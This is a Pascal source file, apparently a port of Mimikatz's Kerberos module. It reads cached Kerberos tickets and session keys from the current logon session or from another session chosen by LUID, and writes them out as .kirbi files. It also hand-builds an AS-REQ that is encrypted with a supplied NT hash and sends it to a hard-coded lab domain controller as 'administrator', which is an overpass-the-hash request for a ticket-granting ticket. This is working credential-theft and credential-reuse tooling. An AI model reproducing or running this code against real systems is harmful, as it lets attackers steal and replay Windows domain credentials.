        log('******* kuhl_m_kerberos_ask *******');
        isexport:=export_;
        //log('sizeof(KERB_RETRIEVE_TKT_REQUEST):'+inttostr(sizeof(KERB_RETRIEVE_TKT_REQUEST)));
        //log('sizeof(KERB_RETRIEVE_TKT_RESPONSE):'+inttostr(sizeof(KERB_RETRIEVE_TKT_RESPONSE)));
        //log('sizeof(KIWI_KERBEROS_TICKET):'+inttostr(sizeof(KIWI_KERBEROS_TICKET)));
        fillchar(ticket,sizeof(ticket),0);
        szTarget:=pwidechar(widestring(target));
	if target<>'' then
	begin
		dwTarget := (length(szTarget) + 1) * sizeof(widechar);
                log('dwTarget:'+inttostr(dwTarget));

		szData := sizeof(KERB_RETRIEVE_TKT_REQUEST) + dwTarget;
                log('szData:'+inttostr(szData));


                pKerbRetrieveRequest:=allocmem(szData);
		if pKerbRetrieveRequest <>nil then
		begin
                        if logonid<>0 then
                           begin
                           pKerbRetrieveRequest^.LogonId.HighPart  :=_luid(logonid).HighPart ;
                           pKerbRetrieveRequest^.LogonId.LowPart  :=_luid(logonid).LowPart ;
                           log('LUID:'+inttohex(LogonId,8));
                           end;
			pKerbRetrieveRequest^.MessageType := KerbRetrieveEncodedTicketMessage;
			pKerbRetrieveRequest^.CacheOptions :=  KERB_RETRIEVE_TICKET_DEFAULT; //isNoCache ? KERB_RETRIEVE_TICKET_DONT_USE_CACHE : KERB_RETRIEVE_TICKET_DEFAULT;
			pKerbRetrieveRequest^.EncryptionType := KERB_ETYPE_DEFAULT; //KERB_ETYPE_RC4_HMAC_NT; // : kull_m_string_args_byName(argc, argv, L'des', NULL, NULL) ? KERB_ETYPE_DES3_CBC_MD5 : kull_m_string_args_byName(argc, argv, L'aes256', NULL, NULL) ? KERB_ETYPE_AES256_CTS_HMAC_SHA1_96 : kull_m_string_args_byName(argc, argv, L'aes128', NULL, NULL) ? KERB_ETYPE_AES128_CTS_HMAC_SHA1_96 : KERB_ETYPE_DEFAULT;
			pKerbRetrieveRequest^.TargetName.Length := dwTarget - sizeof(widechar);
			pKerbRetrieveRequest^.TargetName.MaximumLength  := dwTarget;
			pKerbRetrieveRequest^.TargetName.Buffer := pointer(nativeuint(pKerbRetrieveRequest) + sizeof(KERB_RETRIEVE_TKT_REQUEST));
			//RtlCopyMemory(pKerbRetrieveRequest^.TargetName.Buffer, szTarget, pKerbRetrieveRequest^.TargetName.MaximumLength);
                        copymemory(pKerbRetrieveRequest^.TargetName.Buffer,szTarget,pKerbRetrieveRequest^.TargetName.MaximumLength);
			log('Asking for: '+ strpas(pKerbRetrieveRequest^.TargetName.Buffer),1 );

			status := LsaCallKerberosPackage(pKerbRetrieveRequest, szData, @pKerbRetrieveResponse, @szData, @packageStatus);
			if status=0 then
			begin
				if packageStatus=0 then
				begin
					ticket.ServiceName := pKerbRetrieveResponse^.Ticket.ServiceName;
					ticket.DomainName := pKerbRetrieveResponse^.Ticket.DomainName;
					ticket.TargetName := pKerbRetrieveResponse^.Ticket.TargetName;
					ticket.TargetDomainName := pKerbRetrieveResponse^.Ticket.TargetDomainName;
					ticket.ClientName := pKerbRetrieveResponse^.Ticket.ClientName;
					ticket.AltTargetDomainName := pKerbRetrieveResponse^.Ticket.AltTargetDomainName;

					ticket.StartTime := filetime(pKerbRetrieveResponse^.Ticket.StartTime);
					ticket.EndTime := filetime(pKerbRetrieveResponse^.Ticket.EndTime);
					ticket.RenewUntil := filetime(pKerbRetrieveResponse^.Ticket.RenewUntil);

					ticket.KeyType := pKerbRetrieveResponse^.Ticket.SessionKey.KeyType;
                                        ticket.TicketEncType:=pKerbRetrieveResponse^.Ticket.SessionKey.KeyType;
					ticket.Key.Length := pKerbRetrieveResponse^.Ticket.SessionKey.Length;
					ticket.Key.Value := pKerbRetrieveResponse^.Ticket.SessionKey.Value;

					ticket.TicketFlags := pKerbRetrieveResponse^.Ticket.TicketFlags;
					ticket.Ticket.Length := pKerbRetrieveResponse^.Ticket.EncodedTicketSize;
					ticket.Ticket.Value := pKerbRetrieveResponse^.Ticket.EncodedTicket;

					log('   * Ticket Encryption Type & kvno not representative at screen\n');
					//if(isNoCache or isExport) then
					log('   * NoCache: exported ticket may vary with informations at screen\n');
					kuhl_m_kerberos_ticket_display(@ticket, TRUE, FALSE);

                                        {
					if isTkt then
						if(ticketname = kuhl_m_kerberos_generateFileName_short(&ticket, L'tkt')) then
						begin
							if(kull_m_file_writeData(ticketname, pKerbRetrieveResponse^.Ticket.EncodedTicket, pKerbRetrieveResponse^.Ticket.EncodedTicketSize))
								kprintf(L'\n   * TKT to file       : %s', ticketname);
							else log_AUTO(L'kull_m_file_writeData');
							LocalFree(ticketname);
						end;
                                        }

					//if isExport then filename = kuhl_m_kerberos_generateFileName_short(&ticket, MIMIKATZ_KERBEROS_EXT);

					LsaFreeReturnBuffer(pKerbRetrieveResponse);

					if isExport then
					begin
						pKerbRetrieveRequest^.CacheOptions:= pKerbRetrieveRequest^.CacheOptions or  KERB_RETRIEVE_TICKET_AS_KERB_CRED;
						status:=LsaCallKerberosPackage(pKerbRetrieveRequest, szData, @pKerbRetrieveResponse, @szData, @packageStatus);
						if status=0 then
						begin
							if packageStatus=0 then
							begin
                                                        filename:='ticket.kirbi';
                                                        //filename:=inttohex(ticket.TicketFlags,8)+'-'+UNICODE_STRING_to_ANSISTRING(ticket.ClientName^.Names[0]) +'@'+UNICODE_STRING_to_ANSISTRING(ticket.ServiceName^.Names[0]) +'-'+UNICODE_STRING_to_ANSISTRING(ticket.ServiceName^.Names[1]) +'.kirbi';
                                                        //filename:=string(strpas(ticket.ClientName.Names [0].Buffer)+'.kirbi') ;
								if(kull_m_file_writeData(pchar(filename), pKerbRetrieveResponse^.Ticket.EncodedTicket, pKerbRetrieveResponse^.Ticket.EncodedTicketSize))
									then writeln('* KiRBi to file:'+ filename)
								        else writeln('kull_m_file_writeData failed',1);
								LsaFreeReturnBuffer(pKerbRetrieveResponse);
							end
							else log('LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage / Package :'+inttohex(packageStatus,8),1);
						end
						else log('LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage :'+inttohex(status,8),1);
					end;


				end
				//else if packageStatus = STATUS_NO_TRUST_SAM_ACCOUNT then log(' Kerberos name not found!\n'+ strpas(pKerbRetrieveRequest^.TargetName.Buffer) );
				else log('LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage / Package : %08x\n'+inttohex(packageStatus,8));
			end
			else log('LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage : ' +inttohex(status,8));
                        //0xC000005E STATUS_NO_LOGON_SERVERS
			freemem(pKerbRetrieveRequest);
		end
	end
	else log('At least /target argument is required (eg: /target:cifs/server.lab.local)\n');
	result:= STATUS_SUCCESS;
end;


function NT_SUCCESS(Status: NTSTATUS): BOOL;
begin
  Result := Status >= 0;
end;

function kuhl_m_kerberos_tgt(logonid:int64=0):NTSTATUS;
var
	status, packageStatus:NTSTATUS;
	kerbRetrieveRequest:KERB_RETRIEVE_TKT_REQUEST;// = {KerbRetrieveTicketMessage, {0, 0}, {0, 0, NULL}, 0, 0, KERB_ETYPE_NULL, {0, 0}};
	pKerbRetrieveResponse:PKERB_RETRIEVE_TKT_RESPONSE;
	szData:DWORD;
	kiwiTicket:KIWI_KERBEROS_TICKET; // = {0};
	i:DWORD;
	isNull:BOOL = FALSE;
begin
        fillchar(kerbRetrieveRequest,sizeof(KERB_RETRIEVE_TKT_REQUEST),0);
        kerbRetrieveRequest.MessageType:=KerbRetrieveTicketMessage;
        kerbRetrieveRequest.EncryptionType := KERB_ETYPE_NULL;

        fillchar(kiwiTicket,sizeof(KIWI_KERBEROS_TICKET),0);

        if logonid <>0 then
        begin
        kerbRetrieveRequest.LogonId.HighPart :=_luid(logonid).HighPart ;
        kerbRetrieveRequest.LogonId.lowpart :=_luid(logonid).lowpart ;
        log('LUID:'+inttohex(logonid,8),1)
        end;

	status := LsaCallKerberosPackage(@kerbRetrieveRequest, sizeof(KERB_RETRIEVE_TKT_REQUEST), @pKerbRetrieveResponse, @szData, @packageStatus);

	if NT_SUCCESS(status) then
	begin
		if NT_SUCCESS(packageStatus) then
		begin
                        log('Kerberos TGT of current session : ',1);
			kiwiTicket.ServiceName := pKerbRetrieveResponse^.Ticket.ServiceName;
			kiwiTicket.TargetName := pKerbRetrieveResponse^.Ticket.TargetName;
			kiwiTicket.ClientName := pKerbRetrieveResponse^.Ticket.ClientName;
			kiwiTicket.DomainName := pKerbRetrieveResponse^.Ticket.DomainName;
			kiwiTicket.TargetDomainName := pKerbRetrieveResponse^.Ticket.TargetDomainName;
			kiwiTicket.AltTargetDomainName := pKerbRetrieveResponse^.Ticket.AltTargetDomainName;
			kiwiTicket.TicketFlags := pKerbRetrieveResponse^.Ticket.TicketFlags;
			kiwiTicket.KeyType := pKerbRetrieveResponse^.Ticket.SessionKey.KeyType;
                        kiwiTicket.TicketEncType := pKerbRetrieveResponse^.Ticket.SessionKey.KeyType; // TicketEncType not in response
			kiwiTicket.Key.Length := pKerbRetrieveResponse^.Ticket.SessionKey.Length;
			kiwiTicket.Key.Value := pKerbRetrieveResponse^.Ticket.SessionKey.Value;
			kiwiTicket.StartTime := filetime(pKerbRetrieveResponse^.Ticket.StartTime);
			kiwiTicket.EndTime := filetime(pKerbRetrieveResponse^.Ticket.EndTime);
			kiwiTicket.RenewUntil := filetime(pKerbRetrieveResponse^.Ticket.RenewUntil);
			kiwiTicket.Ticket.Length := pKerbRetrieveResponse^.Ticket.EncodedTicketSize;
			kiwiTicket.Ticket.Value := pKerbRetrieveResponse^.Ticket.EncodedTicket;
			kuhl_m_kerberos_ticket_display(@kiwiTicket, TRUE, FALSE);

                        {
			for(i = 0; !isNull && (i < kiwiTicket.Key.Length); i++) // a revoir
				isNull |= !kiwiTicket.Key.Value[i];
			if(isNull)
				kprintf(L"\n\n\t** Session key is NULL! It means allowtgtsessionkey is not set to 1 **\n");
                        }
			LsaFreeReturnBuffer(pKerbRetrieveResponse);
		end
		//else if(packageStatus = SEC_E_NO_CREDENTIALS) then log('no ticket !',1);
		else log('LsaCallAuthenticationPackage KerbRetrieveTicketMessage / Package : '+inttohex(packageStatus,8),1);
	end
	else log('LsaCallAuthenticationPackage KerbRetrieveTicketMessage : '+inttohex(status,8),1);

        //0xC000000D STATUS_INVALID_PARAMETER

	result:= STATUS_SUCCESS;
end;

function kuhl_m_kerberos_list(logonid:int64=0):NTSTATUS;
var
	status, packageStatus:NTSTATUS;
	kerbCacheRequest:KERB_QUERY_TKT_CACHE_REQUEST; // = {KerbQueryTicketCacheExMessage, {0, 0}};
	pKerbCacheResponse:PKERB_QUERY_TKT_CACHE_EX_RESPONSE;
	pKerbRetrieveRequest:PKERB_RETRIEVE_TKT_REQUEST;
	pKerbRetrieveResponse:PKERB_RETRIEVE_TKT_RESPONSE;
	szData, i:DWORD;
	filename:string;
	export_:BOOL=false;// = kull_m_string_args_byName(argc, argv, L'export', NULL, NULL);
begin
        fillchar(kerbCacheRequest,sizeof(KERB_QUERY_TKT_CACHE_REQUEST),0);
        kerbCacheRequest.MessageType:=KerbQueryTicketCacheExMessage;

        if logonid <>0 then
        begin
        kerbCacheRequest.LogonId.HighPart:=_luid(logonid).HighPart  ;
        kerbCacheRequest.LogonId.lowpart:=_luid(logonid).lowpart  ;
        end;

        status := LsaCallKerberosPackage(@kerbCacheRequest, sizeof(KERB_QUERY_TKT_CACHE_REQUEST), @pKerbCacheResponse, @szData, @packageStatus);

        if (NT_SUCCESS(status)) then
	begin
		if (NT_SUCCESS(packageStatus)) then
		begin
                    if pKerbCacheResponse^.CountOfTickets=0 then exit;
			for i:= 0 to pKerbCacheResponse^.CountOfTickets-1 do
			begin
				//log('EncryptionType:'+inttohex( pKerbCacheResponse^.Tickets[i].EncryptionType,8),1); // kuhl_m_kerberos_ticket_etype(pKerbCacheResponse^.Tickets[i].EncryptionType));
				//log('StartTime:'+kull_m_string_displayLocalFileTime(pfiletime(@pKerbCacheResponse^.Tickets[i].StartTime)),1);
				//log('EndTime:'+kull_m_string_displayLocalFileTime(pfiletime(@pKerbCacheResponse^.Tickets[i].EndTime )),1);
				//log('RenewTime:'+kull_m_string_displayLocalFileTime(pfiletime(@pKerbCacheResponse^.Tickets[i].RenewTime )),1);
				//log('Server Name:'+ UNICODE_STRING_to_ANSISTRING (pKerbCacheResponse^.Tickets[i].ServerName),1); //serverrealm?
				//log('Client Name:'+ UNICODE_STRING_to_ANSISTRING(pKerbCacheResponse^.Tickets[i].ClientName),1); //clientrealm?
				//log('Flags:'+inttohex(pKerbCacheResponse^.Tickets[i].TicketFlags,8),1);
				//kuhl_m_kerberos_ticket_displayFlags(pKerbCacheResponse^.Tickets[i].TicketFlags);
                                //log('***********************************',1);

				if(export_) then
				begin
					szData := sizeof(KERB_RETRIEVE_TKT_REQUEST) + pKerbCacheResponse^.Tickets[i].ServerName.MaximumLength;
                                        pKerbRetrieveRequest:=allocmem(szData);
					if pKerbRetrieveRequest<>nil then
					begin
						pKerbRetrieveRequest^.MessageType := KerbRetrieveEncodedTicketMessage;
						pKerbRetrieveRequest^.CacheOptions := {KERB_RETRIEVE_TICKET_USE_CACHE_ONLY | }KERB_RETRIEVE_TICKET_AS_KERB_CRED;
						pKerbRetrieveRequest^.TicketFlags := pKerbCacheResponse^.Tickets[i].TicketFlags;
						pKerbRetrieveRequest^.TargetName := pKerbCacheResponse^.Tickets[i].ServerName;
						pKerbRetrieveRequest^.TargetName.Buffer := pointer(nativeuint(pKerbRetrieveRequest) + sizeof(KERB_RETRIEVE_TKT_REQUEST));
						//RtlCopyMemory(pKerbRetrieveRequest^.TargetName.Buffer, pKerbCacheResponse^.Tickets[i].ServerName.Buffer, pKerbRetrieveRequest^.TargetName.MaximumLength);
                                                copymemory(pKerbRetrieveRequest^.TargetName.Buffer, pKerbCacheResponse^.Tickets[i].ServerName.Buffer, pKerbRetrieveRequest^.TargetName.MaximumLength);

						status := LsaCallKerberosPackage(pKerbRetrieveRequest, szData, @pKerbRetrieveResponse, @szData, @packageStatus);
						if (NT_SUCCESS(status)) then
						begin
							if (NT_SUCCESS(packageStatus)) then
							begin

                                                                filename:='ticket.kirbi';
                                                                filename:=inttohex(pKerbCacheResponse^.Tickets[i].TicketFlags,8)+'-'+UNICODE_STRING_to_ANSISTRING(pKerbCacheResponse^.Tickets[i].ClientName) +'@'+UNICODE_STRING_to_ANSISTRING(pKerbCacheResponse^.Tickets[i].ClientRealm) +'-'+UNICODE_STRING_to_ANSISTRING(pKerbCacheResponse^.Tickets[i].ServerName ) +'.kirbi';
								//if(filename = kuhl_m_kerberos_generateFileName(i, &pKerbCacheResponse^.Tickets[i], MIMIKATZ_KERBEROS_EXT))
								begin
									if(kull_m_file_writeData(pchar(filename), pKerbRetrieveResponse^.Ticket.EncodedTicket, pKerbRetrieveResponse^.Ticket.EncodedTicketSize))
                                                                        then log('Saved to file:'+ filename,1)
									else log('kull_m_file_writeData failed',1);
									//LocalFree(filename);
								end;
								LsaFreeReturnBuffer(pKerbRetrieveResponse);
							end
							else log('LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage / Package : '+inttohex(packageStatus,8),1);
						end
						else log('LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage : '+inttohex(status,8),1);

						freemem(pKerbRetrieveRequest);
					end;
				end;
			end;
			LsaFreeReturnBuffer(pKerbCacheResponse);
		end
		else log('LsaCallAuthenticationPackage KerbQueryTicketCacheEx2Message / Package : '+inttohex(packageStatus,8),1);
	end
	else log('LsaCallAuthenticationPackage KerbQueryTicketCacheEx2Message : '+inttohex(status,8),1);

	result:= STATUS_SUCCESS;
end;

procedure send_asreq(dest_ip,cname,realm,service:string;encbytes:tbytes);
var
ret,iTotalSize,recvbuflen,val   : Integer;
wsdata      : TWSAdata;
sh          : TSocket;
Remote      : TSockAddr;
recvbuf,buf         :array[0..512-1] of byte;
reply:tbytes;
//
pos:byte;
begin

        //Startup Winsock 2
          ret := WSAStartup(makeword(2,2), wsdata);
        //Create socket
            sh := socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sh = INVALID_SOCKET) then
            begin
              writeln('Socket() failed: '+IntToStr(WSAGetLastError));
              exit;
            end;
        //options

        //val:=0; //512*1024;
        //val:=0;
        //ret := setsockopt(sh, SOL_SOCKET, SO_SNDBUF, pchar(@val), sizeof(val));
        //ret:=setsockopt(sh, IPPROTO_TCP, TCP_NODELAY, pchar(@val), sizeof(val));
        val := 100; //100ms
        ret := setsockopt(sh, SOL_SOCKET, SO_RCVTIMEO, pchar(@val), sizeof(val));
        If ret = SOCKET_ERROR Then  writeln('SetSocket failed');
        ret := setsockopt(sh, SOL_SOCKET, SO_SNDTIMEO, pchar(@val), sizeof(val));
        If ret = SOCKET_ERROR Then  writeln('SetSocket failed');

        val:= 0; //1=non blocking
        //ioctlsocket (sh, FIONBIO, val);

        //prepare datas
            fillchar(buf,sizeof(buf),0);
            iTotalSize:=sizeof(buf); //to be modified later on

            buf[0]:=0;buf[1]:=0;buf[2]:=0;buf[3]:=$e0; //record mark - size //to be modified later on
            buf[4]:=$6a;buf[5]:=$81;buf[6]:=$dd; //??
            buf[7]:=$30;buf[8]:=$81;buf[9]:=$da; //??
            buf[10]:=$a1;buf[11]:=$03;buf[12]:=$02;buf[13]:=$01; //header ??
            buf[14]:=$05; //pvno
            buf[15]:=$a2;buf[16]:=$03;buf[17]:=$02;buf[18]:=$01; //header ??
            buf[19]:=$0a; //krb-as-req
            buf[20]:=$a3;buf[21]:=$58;buf[22]:=$30;buf[23]:=$56; //header ??
            //padata: 2 items
            //PA-DATA pA-ENC-TIMESTAMP
            buf[24]:=$30;buf[25]:=$41;
            buf[26]:=$a1;buf[27]:=$03;buf[28]:=$02;buf[29]:=$01; //header ??
            buf[30]:=$02; //padata-type: pA-ENC-TIMESTAMP (2)
            buf[31]:=$a2;buf[32]:=$3a;buf[33]:=$04;buf[34]:=$38;//header ??
            buf[35]:=$30;buf[36]:=$36;
            buf[37]:=$a0;buf[38]:=$03;buf[39]:=$02;buf[40]:=$01; //header ??
            buf[41]:=$17; //etype: eTYPE-ARCFOUR-HMAC-MD5 (23)
            buf[42]:=$a2;buf[43]:=$2f;buf[44]:=$04;buf[45]:=$2d; //header ??
            //->cipher 45 ($2d) fixes bytes
            {
            buf[46]:=$6d;buf[47]:=$03;buf[48]:=$c0;buf[49]:=$97;buf[50]:=$09;buf[51]:=$e4;buf[52]:=$c2;buf[53]:=$0d;buf[54]:=$d3;buf[55]:=$30;
            buf[56]:=$6c;buf[57]:=$ef;buf[58]:=$91;buf[59]:=$67;buf[60]:=$f8;buf[61]:=$a0;buf[62]:=$f4;buf[63]:=$87;buf[64]:=$6e;buf[65]:=$b0;
            buf[66]:=$26;buf[67]:=$6c;buf[68]:=$be;buf[69]:=$d8;buf[70]:=$ec;buf[71]:=$90;buf[72]:=$8a;buf[73]:=$94;buf[74]:=$cf;buf[75]:=$c6;
            buf[76]:=$a1;buf[77]:=$69;buf[78]:=$e0;buf[79]:=$f2;buf[80]:=$eb;buf[81]:=$43;buf[82]:=$4f;buf[83]:=$d2;buf[84]:=$41;buf[85]:=$23;
            buf[86]:=$b2;buf[87]:=$a9;buf[88]:=$a7;buf[89]:=$38;buf[90]:=$21;
            }
            copymemory(@buf[46],@encbytes[0],45);
            //PA-DATA pA-PAC-REQUEST
            buf[91]:=$30;buf[92]:=$11;
            buf[93]:=$a1;buf[94]:=$04;buf[95]:=$02;buf[96]:=$02; //header ??
            buf[97]:=$00;buf[98]:=$80; //padata-type: pA-PAC-REQUEST (128)
            buf[99]:=$a2;buf[100]:=$09;buf[101]:=$04;buf[102]:=$07; //header ??
            //->padata-value: 3005a003010101
            buf[103]:=$30;buf[104]:=$05;buf[105]:=$a0;buf[106]:=$03;buf[107]:=$01;buf[108]:=$01;buf[109]:=$01;
            buf[110]:=$a4;buf[111]:=$74; // ??
            //req-body
            buf[112]:=$30;buf[113]:=$72; // ??
            buf[114]:=$a0;buf[115]:=$07;buf[116]:=$03;buf[117]:=$05; //header ??
            buf[118]:=$00; //Padding: 0
            buf[119]:=$40;buf[120]:=$80;buf[121]:=$00;buf[122]:=$10; //kdc-options: 40800010
            buf[123]:=$a1;buf[124]:=$1a; // ??
            //cname
            buf[125]:=$30;buf[126]:=$18; // ??
            buf[127]:=$a0;buf[128]:=$03;buf[129]:=$02;buf[130]:=$01;//header ??
            buf[131]:=$01; //name-type: kRB5-NT-PRINCIPAL (1)
            //cname-string: 1 item
            buf[132]:=$a1;buf[133]:=$11;buf[134]:=$30;buf[135]:=$0f;//header ??
            buf[136]:=$1b;buf[137]:=length(cname); //size of the string
            copymemory(@buf[138],@cname[1],length(cname));
            pos:=138+length(cname);
            //realm: home.lab
            buf[pos]:=$a2;buf[pos+1]:=$0a; /// ??
            buf[pos+2]:=$1b;buf[pos+3]:=length(realm);// ??
            copymemory(@buf[pos+4],@realm[1],length(realm));
            pos:=pos+4+length(realm);
            //sname
            buf[pos]:=$a3;buf[pos+1]:=$1d; // ??
            buf[pos+2]:=$30;buf[pos+3]:=$1b; // ??
            buf[pos+4]:=$a0;buf[pos+5]:=$03;buf[pos+6]:=$02;buf[pos+7]:=$01; //header ??
            buf[pos+8]:=$02; //name-type: kRB5-NT-SRV-INST (2)
            buf[pos+9]:=$a1;buf[pos+10]:=$14;buf[pos+11]:=$30;buf[pos+12]:=$12;//header ??
            //sname-string: 2 items
            buf[pos+13]:=$1b;buf[pos+14]:=length(service);
            copymemory(@buf[pos+15],@service[1],length(service));
            pos:=pos+15+length(service);
            buf[pos]:=$1b;buf[pos+1]:=length(realm);
            copymemory(@buf[pos+2],@realm[1],length(realm));
            pos:=pos+2+length(realm);
            //
            buf[pos]:=$a5;buf[pos+1]:=$11;buf[pos+2]:=$18;buf[pos+3]:=$0f; //header ??
            //till: 2037-09-13 04:48:05 (UTC)
            buf[pos+4]:=$32;buf[pos+5]:=$30;buf[pos+6]:=$33;buf[pos+7]:=$37;buf[pos+8]:=$30;buf[pos+9]:=$39;buf[pos+10]:=$31;buf[pos+11]:=$33;buf[pos+12]:=$30;buf[pos+13]:=$34;buf[pos+14]:=$34;buf[pos+15]:=$38;buf[pos+16]:=$30;buf[pos+17]:=$35;buf[pos+18]:=$5a;
            pos:=pos+18;
            buf[pos+1]:=$a7;buf[pos+2]:=$06;buf[pos+3]:=$02;buf[pos+4]:=$04;//header ??
            //nonce: 1344451290
            buf[pos+5]:=$50;buf[pos+6]:=$22;buf[pos+7]:=$b2;buf[pos+8]:=$da;
            pos:=pos+8;
            buf[pos+1]:=$a8;buf[pos+2]:=$05;buf[pos+3]:=$30;buf[pos+4]:=$03;//header ??
            //etype: 1 item
            buf[pos+5]:=$02;buf[pos+6]:=$01;buf[pos+7]:=$17;
            pos:=pos+7;

            //writeln('pos:'+inttostr(pos));
            buf[3]:=pos+1-4; //zero based
            iTotalSize:=pos+1;
            writeln('iTotalSize:'+inttostr(iTotalSize));


        //set remote
            fillchar(remote,sizeof(remote),0);
            remote.sin_family :=AF_INET;
            remote.sin_addr.S_addr  :=inet_Addr(PChar(dest_ip));
            remote.sin_port :=htons(88);;
        //connect (if using send)
            ret:=connect(sh,remote,SizeOf(Remote));
        //sendto or send (if using connect - bit quicker)
            //ret:=SendTo ( sh,  buf, iTotalSize , 0,  Remote, SizeOf(Remote));
            //ret:=Send ( sh,  @buf[0],4 , 0);

            //recvbuflen:=sizeof(recvbuf);
            //ret := recv(sh, @recvbuf[0], recvbuflen, 0);
            //writeln(recvbuflen);

            //ret:=SendTo ( sh,  buf, iTotalSize , 0,  Remote, SizeOf(Remote));
            ret:=Send ( sh,  @buf[0], iTotalSize , 0);
            if ret = SOCKET_ERROR
               then writeln('sendto() failed: '+IntToStr(WSAGetLastError))
               else writeln('sent '+inttostr(iTotalSize)+' bytes');
        //
        // shutdown the connection since no more data will be sent
        //ret:= shutdown(sh, 1); //sd_send=1
        //
        recvbuflen:=sizeof(recvbuf);
        iTotalSize:=0;
        while 1=1 do
        begin
             ret := recv(sh, @recvbuf[0], 512, 0);
             if ret=SOCKET_ERROR then break;;
             iTotalSize:=iTotalSize+ret ;
             setlength(reply,iTotalSize);
             copymemory(@reply[iTotalSize-ret],@recvbuf[0],ret);
        end;
        writeln('reply:'+inttostr(iTotalSize));
        //we should save the ticket part
        // Close socket
        CloseSocket(sh);
        //cleanup
        WSACleanup;
end;

function GetUTCTime: TDateTime;
var
    SystemTime: TSystemTime;
begin
    GetSystemTime(SystemTime);
    with SystemTime do begin
        Result := EncodeTime (wHour, wMinute, wSecond, wMilliSeconds) +
                                              EncodeDate (wYear, wMonth, wDay);
    end ;
end;

function asktgt(key:tbytes):boolean;
var
output,data:tbytes;
i:byte;
d:TDateTime ;
Fmt: TFormatSettings;
s:string;
const
 //till: 2037-09-13 04:48:05 (UTC)
 //nonce: 1344451290

 encbytes:array[0..44] of byte=($6d,$03,$c0,$97,$09,$e4,$c2,$0d,$d3,$30,$6c,$ef,$91,$67,$f8,$a0,$f4,$87,$6e,$b0,$26,$6c,$be,$d8,$ec,$90,$8a,$94,$cf,$c6,$a1,$69,$e0,$f2,$eb,$43,$4f,$d2,$41,$23,$b2,$a9,$a7,$38,$21);
 rawbytes:array[0..20] of byte=($30,$13,$a0,$11,$18,$0f,$32,$30,$32,$32,$31,$32,$30,$33,$31,$31,$34,$38,$33,$35,$5a); //=20221203114835Z
 //encbytes:array[0..44] of byte=($0e,$84,$b5,$d4,$98,$75,$f0,$fd,$47,$ff,$85,$97,$05,$35,$22,$b2,$5c,$fd,$e2,$41,$44,$45,$c0,$e8,$5c,$8b,$c3,$30,$f1,$41,$f9,$5d,$f2,$15,$02,$a3,$8f,$e2,$11,$e1,$4a,$3c,$cd,$4b,$03);
begin
 log('**** asktgt ****');

 writeln(datetimetostr(now));
 s:=(inttostr(yearof(GetUTCTime))+inttostr(monthof(GetUTCTime))+format('%.02d',[dayof(GetUTCTime)])+format('%.02d',[hourof(GetUTCTime)])+format('%.02d',[minuteof(GetUTCTime)])+format('%.02d',[secondof(GetUTCTime)])+'Z');
 writeln(s);

 setlength(data,length(rawbytes));
 copymemory(@data[0],@rawbytes[0],length(rawbytes));
 copymemory(@data[6],@s[1],length(s));

 output:=kuhl_m_kerberos_encrypt(
     KERB_ETYPE_RC4_HMAC_NT,
     KRB_KEY_USAGE_AS_REQ_PA_ENC_TIMESTAMP,
     key,
     data);
 //writeln('encrypted:'+ByteToHexaString (output));

 //
 //
 send_asreq ('192.168.1.121','administrator','home.lab','krbtgt',output);
 exit;
 {
 setlength(data,length(rawbytes));
 copymemory(@data[0],@rawbytes[0],length(rawbytes)); //stuff something in data
 writeln('text:'+BytetoAnsiString(@data[6],16));
 writeln('rawbytes:'+ByteToHexaString (data));
 //see kull_m_kerberos_asn1_PA_DATA_encTimeStamp_build
 output:=kuhl_m_kerberos_encrypt(
     KERB_ETYPE_RC4_HMAC_NT,
     KRB_KEY_USAGE_AS_REQ_PA_ENC_TIMESTAMP,
     key,
     data);

 writeln('encrypted:'+ByteToHexaString (output));

 writeln('*****************');
 }

 setlength(data,length(encbytes));
 copymemory(@data[0],@encbytes[0],length(encbytes)); //stuff something in data
 writeln('encrypted:'+ByteToHexaString (data));

 output:=kuhl_m_kerberos_decrypt(
     KERB_ETYPE_RC4_HMAC_NT,
     KRB_KEY_USAGE_AS_REQ_PA_ENC_TIMESTAMP,
     key,
     data);

 writeln('rawbytes:'+ByteToHexaString (output));
 writeln('text:'+BytetoAnsiString(@output[6],16));

 writeln('*****************');
 //encrypt again - output will be different from original encryption
 output:=kuhl_m_kerberos_encrypt(
     KERB_ETYPE_RC4_HMAC_NT,
     KRB_KEY_USAGE_AS_REQ_PA_ENC_TIMESTAMP,
     key,
     output);
 writeln('encrypted:'+ByteToHexaString (output));
 //decrypt again - output should be identical to original
  output:=kuhl_m_kerberos_decrypt(
     KERB_ETYPE_RC4_HMAC_NT,
     KRB_KEY_USAGE_AS_REQ_PA_ENC_TIMESTAMP,
     key,
     output);
  writeln('rawbytes:'+ByteToHexaString (output));
  writeln('text:'+BytetoAnsiString(@output[6],16));

 exit;


 fmt.ShortDateFormat :='yyyy-mm-dd';
 //fmt.longDateFormat :='yyyy-mm-dd';
 fmt.ShorttimeFormat :='hh:nn:ss';
 //fmt.LongTimeFormat  :='hh:nn:ss';
 fmt.TimeSeparator:=':';
 fmt.dateSeparator:='-';
 d:=StrToDatetime('2037-09-13 04:48:05',fmt);
 writeln(DatetimeToStr (d));
 writeln(FloatToStr(d));
 writeln(ByteToHexaString (output));
end;

function initAPI:boolean;
var
lib:thandle;
begin
 //CDLocateCSystem:=getProcAddress(loadlibrary('cryptdll.dll'),'CDLocateCSystem');
end;

initialization
//initAPI ;

end.

